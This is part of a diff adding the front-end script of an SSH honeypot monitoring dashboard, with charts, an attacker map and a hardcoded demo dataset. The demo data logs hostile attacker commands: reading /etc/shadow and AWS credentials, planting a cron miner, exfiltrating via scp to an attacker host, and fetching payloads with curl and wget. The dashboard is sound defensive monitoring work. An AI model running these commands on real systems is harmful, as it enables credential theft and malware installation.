+    options:{responsive:true,cutout:'62%',
+      plugins:{legend:{position:'bottom',labels:{color:'#567890',boxWidth:10,padding:10,font:{size:9}}}}}
+  });
+}
+
+function renderAttackPatternCharts(attack_types) {
+  const at = attack_types || [];
+  const AT_COLORS = {dictionary_attack:'#ffcc00',targeted_bruteforce:'#ff2d55',bruteforce:'#ff6600',credential_stuffing:'#b060ff',botnet_sweep:'#ff4466'};
+
+  destroyChart('atBar'); destroyChart('atDon');
+  _charts['atBar'] = new Chart($('attackPatternBar'), {
+    type:'bar', data:{
+      labels:at.map(x=>x.type.replace(/_/g,' ')),
+      datasets:[{data:at.map(x=>x.count),backgroundColor:at.map(x=>AT_COLORS[x.type]+'99'||'#56789099'),borderColor:at.map(x=>AT_COLORS[x.type]||'#567890'),borderWidth:1.5,borderRadius:3}]
+    },
+    options:{responsive:true,plugins:{legend:{display:false}},
+      scales:{x:{grid:{color:'rgba(22,35,48,.6)'},ticks:{color:'#567890',font:{size:9}}},
+              y:{grid:{color:'rgba(22,35,48,.6)'},ticks:{color:'#567890',font:{size:9}},beginAtZero:true}}}
+  });
+  _charts['atDon'] = new Chart($('attackPatternDonut'), {
+    type:'doughnut', data:{
+      labels:at.map(x=>x.type.replace(/_/g,' ')),
+      datasets:[{data:at.map(x=>x.count),backgroundColor:at.map(x=>AT_COLORS[x.type]||'#567890'),borderColor:'#080f17',borderWidth:3}]
+    },
+    options:{responsive:true,cutout:'58%',
+      plugins:{legend:{position:'right',labels:{color:'#567890',boxWidth:8,padding:8,font:{size:9}}}}}
+  });
+}
+
+function renderHeatmap(hourly) {
+  const el = $('heatmap');
+  if (!hourly?.length) return;
+  const max = Math.max(...hourly.map(h=>h.count), 1);
+  el.innerHTML = hourly.map(h => {
+    const pct = h.count/max;
+    const r = Math.round(255*Math.min(pct*2, 1));
+    const g = Math.round(255*163/255*(1-pct));
+    const alpha = 0.15 + pct*0.85;
+    const bg = `rgba(${r},${g},0,${alpha.toFixed(2)})`;
+    return `<div class="hm-cell" style="background:${bg}" title="${h.hour}:00 — ${h.count.toLocaleString()} attempts"></div>`;
+  }).join('');
+}
+
+function renderIpRank(ips) {
+  const el = $('ipRank');
+  if (!ips?.length) { el.innerHTML='<div class="loading"><div class="spin"></div></div>'; return; }
+  $('map-tag').textContent = ips.length + ' attackers tracked';
+  el.innerHTML = ips.map((ip,i) => {
+    const score = ip.abuse_score || 0;
+    const cls = score >= 80 ? 'danger' : score >= 50 ? 'warn' : 'ok';
+    const fillColor = score >= 80 ? 'var(--r)' : score >= 50 ? 'var(--y)' : 'var(--g)';
+    const f = flag(ip.country_code);
+    return `<div class="ip-row ${cls}">
+      <span class="ip-num">#${i+1}</span>
+      <div class="ip-info">
+        <span class="ip-addr">${ip.ip}</span>
+        <span class="ip-meta">${f} ${ip.city||'?'}, ${ip.country||'?'} · ${ip.isp||'Unknown ISP'}</span>
+      </div>
+      <div style="display:flex;flex-direction:column;align-items:flex-end;gap:4px">
+        <span style="font-family:var(--font-mono);font-size:10px;color:var(--txt2)">${fmt(ip.count)} attempts</span>
+        <div class="abuse-bar" title="AbuseIPDB score: ${score}"><div class="abuse-fill" style="width:${score}%;background:${fillColor}"></div></div>
+      </div>
+      <span class="chip ${cls==='danger'?'chip-r':cls==='warn'?'chip-y':'chip-g'}">${score}</span>
+    </div>`;
+  }).join('');
+}
+
+function renderCmdTable(cmds, ips) {
+  const ipGeo = {};
+  (ips||[]).forEach(ip => { ipGeo[ip.ip] = ip; });
+  const tb = $('cmdTable');
+  if (!cmds?.length) { tb.innerHTML='<tr><td colspan="4" style="text-align:center;color:var(--txt2);padding:20px">No data</td></tr>'; return; }
+  tb.innerHTML = cmds.map(c => {
+    const geo = ipGeo[c.peer_ip] || {};
+    const f = flag(geo.country_code);
+    return `<tr>
+      <td class="ts">${fmtTs(c.timestamp)}</td>
+      <td><span class="chip chip-c">${c.peer_ip}</span></td>
+      <td><span class="flag">${f}</span> ${geo.country||'—'}</td>
+      <td class="cmd" title="${c.command}">${c.command}</td>
+    </tr>`;
+  }).join('');
+}
+
+function renderSuspTable(events) {
+  const tb = $('suspTable');
+  $('susp-tag').textContent = (events?.length||0)+' recent';
+  if (!events?.length) { tb.innerHTML='<tr><td colspan="6" style="text-align:center;color:var(--txt2);padding:20px">No data</td></tr>'; return; }
+  tb.innerHTML = events.map(e => {
+    let detail = '—';
+    try { const d = JSON.parse(e.detail||'{}'); detail = (d.command||d.url||'').slice(0,60); } catch{}
+    const f = flag(e.country_code);
+    return `<tr>
+      <td class="ts">${fmtTs(e.timestamp)}</td>
+      <td><span class="chip chip-c">${e.peer_ip}</span></td>
+      <td><span class="flag">${f}</span> ${e.country||'—'}</td>
+      <td><span class="chip st-${e.suspicious_type}">${(e.suspicious_type||'').replace(/_/g,' ')}</span></td>
+      <td><span class="chip sev-${e.severity}">${e.severity}</span></td>
+      <td class="cmd" title="${detail}">${detail}</td>
+    </tr>`;
+  }).join('');
+}
+
+function renderSuspDonut(types) {
+  destroyChart('suspD');
+  const COLORS={file_download:'#ffcc00',data_exfiltration:'#ff2d55',interpreter_execution:'#b060ff',
+    persistence:'#ff4466',make_executable:'#ff6600',lateral_movement:'#ff1133',
+    reverse_shell:'#ff0033',obfuscation:'#9960ff'};
+  const t = types||[];
+  _charts['suspD'] = new Chart($('suspDonut'), {
+    type:'doughnut', data:{
+      labels:t.map(x=>x.type.replace(/_/g,' ')),
+      datasets:[{data:t.map(x=>x.count),backgroundColor:t.map(x=>COLORS[x.type]||'#567890'),borderColor:'#080f17',borderWidth:3}]
+    },
+    options:{responsive:true,cutout:'60%',
+      plugins:{legend:{position:'bottom',labels:{color:'#567890',boxWidth:10,padding:10,font:{size:9}}}}}
+  });
+}
+
+function renderSevChart(events) {
+  destroyChart('sev');
+  const counts = {critical:0,high:0,medium:0,low:0};
+  (events||[]).forEach(e => { if(counts[e.severity]!==undefined) counts[e.severity]++; });
+  _charts['sev'] = new Chart($('sevChart'), {
+    type:'bar', data:{
+      labels:['Critical','High','Medium','Low'],
+      datasets:[{data:[counts.critical,counts.high,counts.medium,counts.low],
+        backgroundColor:['rgba(255,45,85,.5)','rgba(255,102,0,.5)','rgba(255,204,0,.4)','rgba(0,255,163,.3)'],
+        borderColor:['#ff2d55','#ff6600','#ffcc00','#00ffa3'],borderWidth:1.5,borderRadius:4}]
+    },
+    options:{responsive:true,plugins:{legend:{display:false}},
+      scales:{x:{grid:{color:'rgba(22,35,48,.6)'},ticks:{color:'#567890',font:{size:10}}},
+              y:{grid:{color:'rgba(22,35,48,.6)'},ticks:{color:'#567890',font:{size:10}},beginAtZero:true}}}
+  });
+}
+
+function renderMalware(malware, summary) {
+  $('mw-count').textContent = fmt(summary?.malware_captures);
+  const urls = new Set((malware||[]).map(m=>m.url));
+  const hashes = new Set((malware||[]).map(m=>m.file_hash).filter(Boolean));
+  $('mw-urls').textContent = urls.size;
+  $('mw-hashes').textContent = hashes.size;
+  const tb = $('malwareTable');
+  if (!malware?.length) { tb.innerHTML='<tr><td colspan="6" style="text-align:center;color:var(--txt2);padding:20px">No captures yet</td></tr>'; return; }
+  tb.innerHTML = malware.map(m => `<tr>
+    <td class="ts">${fmtTs(m.timestamp)}</td>
+    <td><span class="chip chip-c">${m.peer_ip}</span></td>
+    <td><span class="chip ${m.tool==='wget'?'chip-y':'chip-c'}">${m.tool}</span></td>
+    <td style="font-family:var(--font-mono);font-size:10px;color:var(--txt);max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap" title="${m.url}">${m.url||'—'}</td>
+    <td style="font-family:var(--font-mono);font-size:11px;color:var(--o)">${m.filename||'—'}</td>
+    <td class="hash">${(m.file_hash||'').slice(0,24)}…</td>
+  </tr>`).join('');
+}
+
+function initFeed(cmds, susp) {
+  const feed = $('liveFeed');
+  const items = [];
+  (cmds||[]).slice(0,15).forEach(c => items.push({type:'cmd',ts:c.timestamp,ip:c.peer_ip,msg:'$ '+c.command}));
+  (susp||[]).slice(0,10).forEach(s => {
+    let d=''; try{d=JSON.parse(s.detail||'{}').command||''}catch{}
+    items.push({type:'susp',ts:s.timestamp,ip:s.peer_ip,msg:'🚨 '+s.suspicious_type+' — '+d.slice(0,50)});
+  });
+  items.sort((a,b)=>b.ts.localeCompare(a.ts));
+  feed.innerHTML = items.map(it => {
+    const ts = (it.ts||'').slice(11,19);
+    return `<div class="feed-item ${it.type}">
+      <span class="feed-ts">${ts}</span>
+      <span class="feed-ip">${it.ip}</span>
+      <span class="feed-msg">${it.msg}</span>
+    </div>`;
+  }).join('');
+  _feedCount = items.length;
+  $('feed-count').textContent = _feedCount + ' events';
+}
+
+// ══════════════════════════════════════════════════════ MAP ══
+function renderMap(d) {
+  if (!_map) {
+    _map = L.map('map', {zoomControl:true, attributionControl:false}).setView([20,10],2);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{
+      maxZoom:18, attribution:''
+    }).addTo(_map);
+  } else {
+    _map.eachLayer(l => { if(l instanceof L.CircleMarker || l instanceof L.Marker) _map.removeLayer(l); });
+  }
+
+  const pts = d.map_points || [];
+  const maxAttempts = Math.max(...pts.map(p=>p.attempts), 1);
+
+  pts.forEach(pt => {
+    if (!pt.lat || !pt.lon) return;
+    const pct    = pt.attempts / maxAttempts;
+    const score  = pt.abuse_score || 0;
+    const radius = 6 + pct * 22;
+    const color  = score >= 80 ? '#ff2d55' : score >= 50 ? '#ffcc00' : '#00ffa3';
+    const f      = flag(pt.country_code);
+
+    const circle = L.circleMarker([pt.lat, pt.lon], {
+      radius, color, fillColor: color,
+      fillOpacity: 0.25 + pct*0.4,
+      weight: 1.5, opacity: 0.8,
+      className: 'attack-marker',
+    }).addTo(_map);
+
+    circle.bindTooltip(`
+      <div style="min-width:180px">
+        <div style="font-weight:700;color:${color};margin-bottom:4px">${f} ${pt.city||'?'}, ${pt.country||'?'}</div>
+        <div style="color:#a8c4d8"><b style="color:#00ccff">${pt.ip}</b></div>
+        <div style="color:#567890;margin-top:4px">${pt.isp||'Unknown ISP'}</div>
+        <div style="margin-top:6px;display:grid;grid-template-columns:1fr 1fr;gap:4px">
+          <div>Attempts: <b style="color:#00ccff">${pt.attempts.toLocaleString()}</b></div>
+          <div>Abuse: <b style="color:${color}">${score}/100</b></div>
+        </div>
+      </div>
+    `, {className:'map-tooltip', sticky:true});
+  });
+
+  // Add a pulsing ring for top attacker
+  if (pts.length) {
+    const top = pts.reduce((a,b) => a.attempts > b.attempts ? a : b);
+    if (top.lat && top.lon) {
+      L.circleMarker([top.lat, top.lon], {
+        radius: 30, color:'#ff2d55', fill:false, weight:1, opacity:0.3,
+      }).addTo(_map);
+    }
+  }
+}
+
+// ══════════════════════════════════════════════════════ FETCH ══
+async function loadData() {
+  try {
+    const r = await fetch('http://localhost:8080/api/stats',
+      {signal:AbortSignal.timeout(3000)});
+    _data = await r.json();
+    renderAll(_data);
+  } catch {
+    if (!_data) { _data = DEMO_DATA; renderAll(_data); }
+  }
+}
+
+// ══════════════════════════════════════════════════════ DEMO DATA ══
+const DEMO_DATA = {"summary":{"total_attempts":8660,"total_successes":765,"unique_ips":15,"total_commands":3912,"suspicious_events":889,"malware_captures":253,"active_sessions":3,"sessions_today":47,"success_rate":8.8},"timeline":[{"date":"2026-04-18","attempts":389,"successes":30,"commands":152},{"date":"2026-04-19","attempts":786,"successes":73,"commands":396},{"date":"2026-04-20","attempts":915,"successes":83,"commands":441},{"date":"2026-04-21","attempts":364,"successes":40,"commands":204},{"date":"2026-04-22","attempts":248,"successes":24,"commands":163},{"date":"2026-04-23","attempts":505,"successes":50,"commands":172},{"date":"2026-04-24","attempts":570,"successes":32,"commands":242},{"date":"2026-04-25","attempts":461,"successes":44,"commands":232},{"date":"2026-04-26","attempts":910,"successes":81,"commands":416},{"date":"2026-04-27","attempts":743,"successes":72,"commands":322},{"date":"2026-04-28","attempts":580,"successes":48,"commands":282},{"date":"2026-04-29","attempts":579,"successes":47,"commands":287},{"date":"2026-04-30","attempts":778,"successes":78,"commands":314},{"date":"2026-05-01","attempts":173,"successes":15,"commands":67}],"top_usernames":[{"value":"guest","count":412},{"value":"test","count":404},{"value":"jenkins","count":397},{"value":"ec2-user","count":396},{"value":"ansible","count":393},{"value":"hadoop","count":393},{"value":"user","count":393},{"value":"oracle","count":391},{"value":"pi","count":381},{"value":"support","count":379},{"value":"ftp","count":372},{"value":"mysql","count":370}],"top_passwords":[{"value":"raspberry","count":353},{"value":"dragon","count":349},{"value":"1234","count":347},{"value":"test","count":346},{"value":"batman","count":339},{"value":"letmein","count":334},{"value":"changeme","count":330},{"value":"admin","count":329},{"value":"root123","count":329},{"value":"default","count":328},{"value":"password","count":326},{"value":"master","count":325}],"top_ips":[{"ip":"194.165.16.75","count":703,"country":"Iran","country_code":"IR","city":"Tehran","isp":"Erfan Net","lat":35.69,"lon":51.42,"abuse_score":82},{"ip":"80.94.92.241","count":684,"country":"Ukraine","country_code":"UA","city":"Kyiv","isp":"Volia","lat":50.45,"lon":30.52,"abuse_score":85},{"ip":"45.33.32.156","count":668,"country":"United States","country_code":"US","city":"Atlanta","isp":"Linode LLC","lat":33.74,"lon":-84.38,"abuse_score":72},{"ip":"77.83.36.55","count":663,"country":"Netherlands","country_code":"NL","city":"Breda","isp":"Verdant BV","lat":51.59,"lon":4.78,"abuse_score":67},{"ip":"178.128.23.9","count":638,"country":"Singapore","country_code":"SG","city":"Singapore","isp":"DigitalOcean","lat":1.29,"lon":103.85,"abuse_score":44},{"ip":"52.87.193.204","count":637,"country":"United States","country_code":"US","city":"Ashburn","isp":"Amazon AWS","lat":39.04,"lon":-77.49,"abuse_score":20},{"ip":"91.213.50.8","count":631,"country":"Bulgaria","country_code":"BG","city":"Sofia","isp":"Neterra Ltd","lat":42.69,"lon":23.32,"abuse_score":76},{"ip":"185.234.219.20","count":596,"country":"Russia","country_code":"RU","city":"Moscow","isp":"Hosting Ltd","lat":55.75,"lon":37.62,"abuse_score":98},{"ip":"109.248.9.14","count":567,"country":"China","country_code":"CN","city":"Beijing","isp":"Alibaba Cloud","lat":39.91,"lon":116.39,"abuse_score":79},{"ip":"146.185.133.197","count":554,"country":"Romania","country_code":"RO","city":"Bucharest","isp":"M247 Ltd","lat":44.43,"lon":26.1,"abuse_score":88}],"attack_types":[{"type":"dictionary_attack","count":3552},{"type":"targeted_bruteforce","count":2218},{"type":"bruteforce","count":1578},{"type":"credential_stuffing","count":1312}],"top_commands":[{"cmd":"cat","count":778},{"cmd":"ls","count":161},{"cmd":"free","count":141},{"cmd":"scp","count":138},{"cmd":"ifconfig","count":138},{"cmd":"grep","count":138},{"cmd":"whoami","count":136},{"cmd":"python3","count":135},{"cmd":"netstat","count":135},{"cmd":"uname","count":134},{"cmd":"env","count":133},{"cmd":"wget","count":132}],"recent_commands":[{"timestamp":"2026-05-01T05:38:55+00:00","peer_ip":"5.188.86.172","command":"chmod +x /tmp/x.sh"},{"timestamp":"2026-05-01T05:35:43+00:00","peer_ip":"5.188.86.172","command":"echo '*/5 * * * * /tmp/miner' >> /var/spool/cron/crontabs/root"},{"timestamp":"2026-05-01T05:34:03+00:00","peer_ip":"5.188.86.172","command":"cat /root/.env"},{"timestamp":"2026-05-01T05:33:43+00:00","peer_ip":"5.188.86.172","command":"cat /etc/shadow"},{"timestamp":"2026-05-01T04:01:54+00:00","peer_ip":"109.248.9.14","command":"ps aux"},{"timestamp":"2026-05-01T03:59:42+00:00","peer_ip":"109.248.9.14","command":"cat /root/.env"},{"timestamp":"2026-05-01T03:56:25+00:00","peer_ip":"109.248.9.14","command":"/tmp/x.sh"},{"timestamp":"2026-05-01T03:55:56+00:00","peer_ip":"109.248.9.14","command":"scp /tmp/etc.tar.gz attacker@1.2.3.4:/tmp/"},{"timestamp":"2026-05-01T03:55:46+00:00","peer_ip":"109.248.9.14","command":"echo '*/5 * * * * /tmp/miner' >> /var/spool/cron/crontabs/root"},{"timestamp":"2026-05-01T03:55:11+00:00","peer_ip":"109.248.9.14","command":"cat /etc/shadow"},{"timestamp":"2026-05-01T03:54:56+00:00","peer_ip":"109.248.9.14","command":"uname -a"},{"timestamp":"2026-05-01T03:47:57+00:00","peer_ip":"91.213.50.8","command":"cat /root/.aws/credentials"},{"timestamp":"2026-05-01T03:47:29+00:00","peer_ip":"91.213.50.8","command":"ls -la"},{"timestamp":"2026-05-01T02:54:38+00:00","peer_ip":"80.94.92.241","command":"ssh root@10.0.1.100"},{"timestamp":"2026-05-01T02:54:34+00:00","peer_ip":"80.94.92.241","command":"curl http://193.106.31.72/miner -o /tmp/miner"},{"timestamp":"2026-05-01T02:53:49+00:00","peer_ip":"80.94.92.241","command":"cat /root/.aws/credentials"}],"suspicious_types":[{"type":"file_download","count":253},{"type":"data_exfiltration","count":138},{"type":"interpreter_execution","count":135},{"type":"persistence","count":126},{"type":"make_executable","count":120},{"type":"lateral_movement","count":117}],"recent_suspicious":[{"timestamp":"2026-05-01T05:38:55+00:00","peer_ip":"5.188.86.172","suspicious_type":"make_executable","detail":"{\"command\":\"chmod +x /tmp/x.sh\"}","severity":"medium","country":"Russia","country_code":"RU"},{"timestamp":"2026-05-01T05:35:43+00:00","peer_ip":"5.188.86.172","suspicious_type":"persistence","detail":"{\"command\":\"echo '*/5 * * * * /tmp/miner' >> /var/spool/cron/crontabs/root\"}","severity":"critical","country":"Russia","country_code":"RU"},{"timestamp":"2026-05-01T03:55:56+00:00","peer_ip":"109.248.9.14","suspicious_type":"data_exfiltration","detail":"{\"command\":\"scp /tmp/etc.tar.gz attacker@1.2.3.4:/tmp/\"}","severity":"critical","country":"China","country_code":"CN"},{"timestamp":"2026-05-01T03:55:46+00:00","peer_ip":"109.248.9.14","suspicious_type":"persistence","detail":"{\"command\":\"echo '*/5 * * * * /tmp/miner' >> /var/spool/cron/crontabs/root\"}","severity":"critical","country":"China","country_code":"CN"},{"timestamp":"2026-05-01T03:48:37+00:00","peer_ip":"91.213.50.8","suspicious_type":"data_exfiltration","detail":"{\"command\":\"scp /tmp/etc.tar.gz attacker@1.2.3.4:/tmp/\"}","severity":"critical","country":"Bulgaria","country_code":"BG"},{"timestamp":"2026-05-01T02:54:38+00:00","peer_ip":"80.94.92.241","suspicious_type":"lateral_movement","detail":"{\"command\":\"ssh root@10.0.1.100\"}","severity":"critical","country":"Ukraine","country_code":"UA"},{"timestamp":"2026-05-01T02:54:34+00:00","peer_ip":"80.94.92.241","suspicious_type":"file_download","detail":"{\"command\":\"curl http://193.106.31.72/miner -o /tmp/miner\"}","severity":"high","country":"Ukraine","country_code":"UA"},{"timestamp":"2026-05-01T01:29:39+00:00","peer_ip":"146.185.133.197","suspicious_type":"lateral_movement","detail":"{\"command\":\"ssh root@10.0.1.100\"}","severity":"critical","country":"Romania","country_code":"RO"},{"timestamp":"2026-05-01T01:25:59+00:00","peer_ip":"146.185.133.197","suspicious_type":"file_download","detail":"{\"command\":\"wget http://45.33.32.156/x.sh -O /tmp/x.sh\"}","severity":"high","country":"Romania","country_code":"RO"},{"timestamp":"2026-05-01T01:20:57+00:00","peer_ip":"146.185.133.197","suspicious_type":"interpreter_execution","detail":"{\"command\":\"python3 -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'\"}","severity":"high","country":"Romania","country_code":"RO"}],"map_points":[{"ip":"104.236.198.48","lat":37.77,"lon":-122.41,"country":"United States","country_code":"US","city":"San Francisco","isp":"DigitalOcean","abuse_score":55,"attempts":516},{"ip":"109.248.9.14","lat":39.91,"lon":116.39,"country":"China","country_code":"CN","city":"Beijing","isp":"Alibaba Cloud","abuse_score":79,"attempts":567},{"ip":"138.197.148.152","lat":50.11,"lon":8.68,"country":"Germany","country_code":"DE","city":"Frankfurt","isp":"DigitalOcean","abuse_score":60,"attempts":476},{"ip":"146.185.133.197","lat":44.43,"lon":26.1,"country":"Romania","country_code":"RO","city":"Bucharest","isp":"M247 Ltd","abuse_score":88,"attempts":554},{"ip":"178.128.23.9","lat":1.29,"lon":103.85,"country":"Singapore","country_code":"SG","city":"Singapore","isp":"DigitalOcean","abuse_score":44,"attempts":638},{"ip":"185.234.219.20","lat":55.75,"lon":37.62,"country":"Russia","country_code":"RU","city":"Moscow","isp":"Hosting Ltd","abuse_score":98,"attempts":596},{"ip":"193.106.31.72","lat":52.37,"lon":4.9,"country":"Netherlands","country_code":"NL","city":"Amsterdam","isp":"Serverius","abuse_score":91,"attempts":429},{"ip":"194.165.16.75","lat":35.69,"lon":51.42,"country":"Iran","country_code":"IR","city":"Tehran","isp":"Erfan Net","abuse_score":82,"attempts":703},{"ip":"45.142.212.100","lat":41.01,"lon":28.95,"country":"Turkey","country_code":"TR","city":"Istanbul","isp":"Stark Industries","abuse_score":93,"attempts":445},{"ip":"45.33.32.156","lat":33.74,"lon":-84.38,"country":"United States","country_code":"US","city":"Atlanta","isp":"Linode LLC","abuse_score":72,"attempts":668},{"ip":"5.188.86.172","lat":59.93,"lon":30.32,"country":"Russia","country_code":"RU","city":"St Petersburg","isp":"Pin-Up LLC","abuse_score":95,"attempts":453},{"ip":"52.87.193.204","lat":39.04,"lon":-77.49,"country":"United States","country_code":"US","city":"Ashburn","isp":"Amazon AWS","abuse_score":20,"attempts":637},{"ip":"77.83.36.55","lat":51.59,"lon":4.78,"country":"Netherlands","country_code":"NL","city":"Breda","isp":"Verdant BV","abuse_score":67,"attempts":663},{"ip":"80.94.92.241","lat":50.45,"lon":30.52,"country":"Ukraine","country_code":"UA","city":"Kyiv","isp":"Volia","abuse_score":85,"attempts":684},{"ip":"91.213.50.8","lat":42.69,"lon":23.32,"country":"Bulgaria","country_code":"BG","city":"Sofia","isp":"Neterra Ltd","abuse_score":76,"attempts":631}],"hourly_heatmap":[{"hour":0,"count":341},{"hour":1,"count":437},{"hour":2,"count":420},{"hour":3,"count":396},{"hour":4,"count":265},{"hour":5,"count":188},{"hour":6,"count":152},{"hour":7,"count":262},{"hour":8,"count":305},{"hour":9,"count":451},{"hour":10,"count":408},{"hour":11,"count":366},{"hour":12,"count":471},{"hour":13,"count":462},{"hour":14,"count":325},{"hour":15,"count":349},{"hour":16,"count":453},{"hour":17,"count":433},{"hour":18,"count":564},{"hour":19,"count":400},{"hour":20,"count":326},{"hour":21,"count":410},{"hour":22,"count":182},{"hour":23,"count":294}],"recent_malware":[{"timestamp":"2026-05-01T02:54:34+00:00","peer_ip":"80.94.92.241","url":"http://193.106.31.72/miner","tool":"curl","filename":"miner","file_hash":"sha256:9699e7f36afd2e74"},{"timestamp":"2026-05-01T02:20:18+00:00","peer_ip":"52.87.193.204","url":"http://45.33.32.156/x.sh","tool":"wget","filename":"x.sh","file_hash":"sha256:d0ea34c89ac60c25"},{"timestamp":"2026-05-01T01:25:59+00:00","peer_ip":"146.185.133.197","url":"http://45.33.32.156/x.sh","tool":"wget","filename":"x.sh","file_hash":"sha256:52216b515196fa83"},{"timestamp":"2026-04-30T23:50:47+00:00","peer_ip":"45.142.212.100","url":"http://45.33.32.156/x.sh","tool":"wget","filename":"x.sh","file_hash":"sha256:6908ba7358651a4e"},{"timestamp":"2026-04-30T21:12:19+00:00","peer_ip":"194.165.16.75","url":"http://193.106.31.72/miner","tool":"curl","filename":"miner","file_hash":"sha256:d4d0b18a56a584ed"},{"timestamp":"2026-04-30T18:45:57+00:00","peer_ip":"109.248.9.14","url":"http://45.33.32.156/x.sh","tool":"wget","filename":"x.sh","file_hash":"sha256:33b57b6b338ce0ef"}]};
+
+// ══════════════════════════════════════════════════════ INIT ══
+loadData();
+connectWS();
+setInterval(loadData, 30000);
+</script>
+</body>
+</html>
